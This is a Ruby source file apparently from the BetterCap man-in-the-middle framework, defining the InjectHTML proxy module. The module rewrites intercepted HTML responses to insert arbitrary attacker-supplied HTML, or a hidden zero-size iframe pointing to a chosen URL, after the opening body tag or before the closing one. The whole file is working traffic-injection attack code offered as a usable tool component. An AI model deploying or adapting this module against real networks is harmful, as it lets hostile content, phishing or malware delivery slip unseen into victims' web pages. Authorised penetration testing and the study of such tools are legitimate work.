# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

# This proxy module will take care of HTML code injection.
class InjectHTML < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'InjectHTML',
    'Description' => 'This proxy module will take care of HTML code injection.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  # URL of the iframe if --html-iframe-url was specified.
  @@iframe = nil
  # HTML data to be injected.
  @@data = nil
  # Position of the injection, 0 = just after <body>, 1 = before </body>
  @@position = 0
  # Maximum number of times to inject.
  @@max = 1000000
  # Counter for the number of injections.
  @@cnt = 0

  # Add custom command line arguments to the +opts+ OptionParser instance.
  def self.on_options(opts)
    opts.separator ""
    opts.separator "Inject HTML Proxy Module Options:"
    opts.separator ""

    opts.on( '--html-data STRING', 'HTML code to be injected.' ) do |v|
      @@data = v
    end

    opts.on( '--html-file PATH', 'Path of the html file to be injected.' ) do |v|
      filename = File.expand_path v
      raise BetterCap::Error, "#{filename} invalid file." unless File.exists?(filename)
      @@data = File.read( filename )
    end

    opts.on( '--html-iframe-url URL', 'URL of the iframe that will be injected, if this option is specified an "iframe" tag will be injected.' ) do |v|
      @@iframe = v
    end

    opts.on( '--html-position POSITION', 'Position of the injection, valid values are START for injecting after the <body> tag and END to inject just before </body>.' ) do |v|
      if v == 'START'
        @@position = 0
      elsif v == 'END'
        @@position = 1
      else
        raise BetterCap::Error, "#{v} invalid position, only START or END values are accepted."
      end
    end

    opts.on( '--html-max NUM', 'Maximum number of times to inject.' ) do |v|
      @@max = v.to_i
    end
  end

  # Create an instance of this module and raise a BetterCap::Error if command
  # line arguments weren't correctly specified.
  def initialize
    raise BetterCap::Error, "No --html-file, --html-data or --html-iframe-url options specified for the proxy module." if @@data.nil? and @@iframe.nil?
  end

  # Called by the BetterCap::Proxy::HTTP::Proxy processor on each HTTP +request+ and
  # +response+.
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/ and ( @@cnt < @@max )
      @@cnt += 1
      BetterCap::Logger.info "[#{'INJECTHTML'.green}] Injecting HTML code into #{request.to_url}"

      if @@data.nil?
        replacement = "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe>"
      else
        replacement = "#{@@data}"
      end

      if @@position == 0
        response.body.sub!( /<body([^>]*)>/i ) { "<body#{$1}>#{replacement}" }
      else
        response.body.sub!( /<\/body>/i ) { "#{replacement}</body>" }
      end
    end
  end
end
